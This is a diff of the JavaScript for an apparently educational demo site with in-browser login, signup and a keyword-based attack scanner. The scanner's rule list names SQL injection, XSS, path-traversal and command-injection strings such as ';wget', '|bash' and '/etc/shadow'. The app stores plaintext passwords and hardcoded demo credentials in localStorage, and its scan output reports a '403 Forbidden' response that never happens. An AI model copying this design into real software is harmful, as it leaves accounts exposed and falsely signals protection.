+     JAVASCRIPT — ALL LOGIC
+══════════════════════════════════════════ -->
+<script>
+// ── Storage keys ─────────────────────────────────────────────────────────────
+var USERS_KEY   = 'sz_users';
+var SESSION_KEY = 'sz_session';
+var ATTACKS_KEY = 'sz_attacks';
+
+// ── Init default demo users ───────────────────────────────────────────────────
+(function() {
+  if (!localStorage.getItem(USERS_KEY)) {
+    localStorage.setItem(USERS_KEY, JSON.stringify([
+      { name:'John Demo',  email:'john@demo.com',  pw:'pass123',  joined:'January 15, 2024' },
+      { name:'Alice Smith',email:'alice@demo.com', pw:'hello123', joined:'February 20, 2024' }
+    ]));
+  }
+})();
+
+function getUsers()   { return JSON.parse(localStorage.getItem(USERS_KEY)   || '[]'); }
+function getSession() { return JSON.parse(localStorage.getItem(SESSION_KEY) || 'null'); }
+function setSession(u){ localStorage.setItem(SESSION_KEY, JSON.stringify(u)); }
+function endSession() { localStorage.removeItem(SESSION_KEY); }
+function getLogs()    { return JSON.parse(localStorage.getItem(ATTACKS_KEY) || '[]'); }
+function saveLogs(l)  { localStorage.setItem(ATTACKS_KEY, JSON.stringify(l)); }
+function addLog(type, input) {
+  var logs = getLogs();
+  logs.unshift({ type:type, input:String(input).slice(0,60), time: new Date().toLocaleString() });
+  saveLogs(logs.slice(0,100));
+}
+
+// ── Page navigation ───────────────────────────────────────────────────────────
+function goTo(page) {
+  // Check protected route
+  if (page === 'dashboard' && !getSession()) { goTo('login'); return; }
+
+  document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
+  var el = document.getElementById('page-' + page);
+  if (el) {
+    el.classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  if (page === 'home')      updateHomeNav();
+  if (page === 'dashboard') loadDashboard();
+}
+
+function updateHomeNav() {
+  var s = getSession();
+  var btns = document.getElementById('home-nav-btns');
+  if (!btns) return;
+  if (s) {
+    btns.innerHTML =
+      '<button class="btn btn-outline" onclick="goTo(\'dashboard\')">Dashboard</button>' +
+      '<button class="btn btn-solid" onclick="doLogout()">Log Out</button>';
+  } else {
+    btns.innerHTML =
+      '<button class="btn btn-outline" onclick="goTo(\'login\')">Log In</button>' +
+      '<button class="btn btn-solid" onclick="goTo(\'signup\')">Sign Up</button>';
+  }
+}
+
+// ── SecureShield scanner ──────────────────────────────────────────────────────
+function scanInput(text) {
+  var v = (text || '').toLowerCase();
+  var rules = [
+    { p:["'--","or '1'","1=1","union select","'; drop","; select","exec(","waitfor","sleep(","xp_cmd","benchmark("], t:"SQL Injection" },
+    { p:["<script","onerror=","onload=","javascript:","alert(","document.cookie","eval(","vbscript:"], t:"XSS Attack" },
+    { p:["../","..\\","/etc/passwd","/etc/shadow","c:\\windows"], t:"Path Traversal" },
+    { p:[";wget",";curl","|bash","| bash",";ls ","`whoami`","$(id)"], t:"Command Injection" }
+  ];
+  for (var i=0;i<rules.length;i++)
+    for (var j=0;j<rules[i].p.length;j++)
+      if (v.indexOf(rules[i].p[j]) !== -1) return rules[i].t;
+  return null;
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── LOGIN ─────────────────────────────────────────────────────────────────────
+function loginFill(email, pw) {
+  document.getElementById('l-email').value = email;
+  document.getElementById('l-pass').value  = pw;
+  doLogin();
+}
+
+function doLogin() {
+  var email = document.getElementById('l-email').value.trim();
+  var pw    = document.getElementById('l-pass').value.trim();
+
+  document.getElementById('login-blocked').style.display = 'none';
+  document.getElementById('login-err').style.display     = 'none';
+
+  if (!email || !pw) { showLoginErr('Please enter your email and password.'); return; }
+
+  // SecureShield scan
+  var atk = scanInput(email) || scanInput(pw);
+  if (atk) {
+    addLog(atk, email);
+    document.getElementById('login-blocked-type').textContent = atk;
+    document.getElementById('login-blocked').style.display = 'block';
+    return;
+  }
+
+  // Find user
+  var users = getUsers(), found = null;
+  for (var i=0;i<users.length;i++) {
+    if (users[i].email.toLowerCase() === email.toLowerCase() && users[i].pw === pw) {
+      found = users[i]; break;
+    }
+  }
+
+  if (!found) { showLoginErr('Wrong email or password. Try the demo buttons above!'); return; }
+
+  setSession({ name:found.name, email:found.email, joined:found.joined });
+  goTo('dashboard');
+}
+
+function showLoginErr(msg) {
+  var el = document.getElementById('login-err');
+  el.textContent = msg; el.style.display = 'block';
+}
+
+// ── SIGNUP ────────────────────────────────────────────────────────────────────
+function pwStrength(v) {
+  var score = 0;
+  if(v.length>=6) score++; if(v.length>=10) score++;
+  if(/[A-Z]/.test(v)) score++; if(/[0-9]/.test(v)) score++; if(/[^A-Za-z0-9]/.test(v)) score++;
+  var fill = document.getElementById('pw-fill');
+  fill.style.width = (score/5*100) + '%';
+  fill.style.background = ['#ef4444','#f97316','#eab308','#84cc16','#22c55e'][score-1] || '#e0d9ce';
+}
+
+function doSignup() {
+  var fname = document.getElementById('s-fname').value.trim();
+  var lname = document.getElementById('s-lname').value.trim();
+  var email = document.getElementById('s-email').value.trim();
+  var pw    = document.getElementById('s-pass').value.trim();
+  var conf  = document.getElementById('s-confirm').value.trim();
+
+  document.getElementById('signup-blocked').style.display = 'none';
+  document.getElementById('signup-err').style.display     = 'none';
+
+  if (!fname||!lname||!email||!pw||!conf) { showSignupErr('Please fill in all fields.'); return; }
+
+  // SecureShield scan all fields
+  var fields = [fname,lname,email,pw];
+  for (var i=0;i<fields.length;i++) {
+    var atk = scanInput(fields[i]);
+    if (atk) {
+      addLog(atk, fields[i]);
+      document.getElementById('signup-blocked-type').textContent = atk;
+      document.getElementById('signup-blocked').style.display = 'block';
+      return;
+    }
+  }
+
+  if (!email.includes('@')||!email.includes('.')) { showSignupErr('Please enter a valid email.'); return; }
+  if (pw.length < 6) { showSignupErr('Password must be at least 6 characters.'); return; }
+  if (pw !== conf)   { showSignupErr('Passwords do not match.'); return; }
+
+  var users = getUsers();
+  for (var j=0;j<users.length;j++) {
+    if (users[j].email.toLowerCase() === email.toLowerCase()) {
+      showSignupErr('This email is already registered. Try logging in.'); return;
+    }
+  }
+
+  var today = new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
+  var newU = { name:fname+' '+lname, email:email, pw:pw, joined:today };
+  users.push(newU);
+  localStorage.setItem(USERS_KEY, JSON.stringify(users));
+
+  setSession({ name:newU.name, email:newU.email, joined:newU.joined });
+  goTo('dashboard');
+}
+
+function showSignupErr(msg) {
+  var el = document.getElementById('signup-err');
+  el.textContent = msg; el.style.display = 'block';
+}
+
+// ── LOGOUT ────────────────────────────────────────────────────────────────────
+function doLogout() {
+  endSession();
+  goTo('home');
+}
+
+// ── DASHBOARD ─────────────────────────────────────────────────────────────────
+function loadDashboard() {
+  var s = getSession();
+  if (!s) { goTo('login'); return; }
+
+  // Sidebar + header
+  var initials = s.name.split(' ').map(function(w){return w[0];}).join('').toUpperCase().slice(0,2);
+  document.getElementById('db-av').textContent          = initials;
+  document.getElementById('db-uname').textContent       = s.name;
+  document.getElementById('db-uemail').textContent      = s.email;
+  document.getElementById('db-welcome-name').textContent = s.name.split(' ')[0];
+
+  // Profile
+  document.getElementById('p-name').textContent   = s.name;
+  document.getElementById('p-email').textContent  = s.email;
+  document.getElementById('p-joined').textContent = s.joined || 'Today';
+
+  refreshStats();
+}
+
+function refreshStats() {
+  var logs  = getLogs();
+  var sql=0, xss=0, other=0;
+  logs.forEach(function(l){
+    if(l.type==='SQL Injection') sql++;
+    else if(l.type==='XSS Attack') xss++;
+    else other++;
+  });
+
+  document.getElementById('db-total').textContent = logs.length;
+  document.getElementById('st-total').textContent = logs.length;
+  document.getElementById('st-sql').textContent   = sql;
+  document.getElementById('st-xss').textContent   = xss;
+  document.getElementById('st-other').textContent = other;
+
+  // Log list
+  var logBody = document.getElementById('db-log-body');
+  if (logs.length === 0) {
+    logBody.innerHTML = '<div class="empty-st"><div class="eicon">✅</div><p>No attacks yet.<br/>Try the scanner below!</p></div>';
+  } else {
+    logBody.innerHTML = logs.slice(0,10).map(function(l){
+      return '<div class="atk-item">' +
+        '<div class="atk-dot"></div>' +
+        '<div><div class="atk-type">'+l.type+'</div>' +
+        '<div class="atk-meta">'+l.time+'</div>' +
+        '<div class="atk-meta" style="color:#444;margin-top:2px">'+esc(l.input)+'</div></div>' +
+        '<span class="atk-badge">BLOCKED</span></div>';
+    }).join('');
+  }
+
+  // Breakdown
+  var bd = document.getElementById('db-breakdown');
+  if (logs.length === 0) {
+    bd.innerHTML = '<div style="color:var(--dmuted);font-size:.82rem;text-align:center;padding:14px 0">No attacks yet</div>';
+  } else {
+    var types = [{n:'SQL Injection',icon:'💉',c:sql},{n:'XSS Attack',icon:'⚡',c:xss},{n:'Other',icon:'📂',c:other}].filter(function(t){return t.c>0;});
+    var mx = Math.max.apply(null,types.map(function(t){return t.c;}));
+    bd.innerHTML = types.map(function(t){
+      return '<div class="bk-item"><div class="bk-icon">'+t.icon+'</div>' +
+        '<div class="bk-info"><div class="bk-name">'+t.n+'</div>' +
+        '<div class="bk-bar-wrap"><div class="bk-bar" style="width:'+(mx>0?Math.round(t.c/mx*100):0)+'%"></div></div></div>' +
+        '<div class="bk-cnt">'+t.c+'</div></div>';
+    }).join('');
+  }
+}
+
+// ── LIVE SCANNER ──────────────────────────────────────────────────────────────
+function scanQuick(v) {
+  document.getElementById('scan-in').value = v;
+  doScan();
+}
+
+function doScan() {
+  var input = document.getElementById('scan-in').value.trim();
+  var out   = document.getElementById('scan-out');
+
+  if (!input) {
+    out.className = 'scan-result safe'; out.style.display = 'block';
+    out.textContent = 'Please type something to scan.'; return;
+  }
+
+  var atk = scanInput(input);
+  out.style.display = 'block';
+
+  if (atk) {
+    addLog(atk, input);
+    out.className = 'scan-result blocked';
+    out.textContent =
+      '🚨 BLOCKED — ' + atk + ' Detected\n' +
+      '① Input: "' + input.slice(0,50) + '"\n' +
+      '② scan_url() matched attack pattern\n' +
+      '③ HTTP 403 Forbidden returned\n' +
+      '④ Attack logged ✅';
+    refreshStats();
+  } else {
+    out.className = 'scan-result safe';
+    out.textContent =
+      '✅ SAFE — No threats detected\n' +
+      '① Input: "' + input.slice(0,50) + '"\n' +
+      '② scan_url() found no attack patterns\n' +
+      '③ Request passed through normally ✅';
+  }
+}
+
+function clearLog() { saveLogs([]); refreshStats(); }
+
+// ── ENTER KEY SUPPORT ─────────────────────────────────────────────────────────
+document.getElementById('l-pass').addEventListener('keypress',  function(e){ if(e.key==='Enter') doLogin(); });
+document.getElementById('l-email').addEventListener('keypress', function(e){ if(e.key==='Enter') doLogin(); });
+document.getElementById('s-confirm').addEventListener('keypress',function(e){ if(e.key==='Enter') doSignup(); });
+document.getElementById('scan-in').addEventListener('keypress', function(e){ if(e.key==='Enter') doScan(); });
+
+// ── INIT ──────────────────────────────────────────────────────────────────────
+updateHomeNav();
+// If already logged in and someone bookmarks the page, stay on home
+// They can click Dashboard to go there
+</script>
+</body>
+</html>
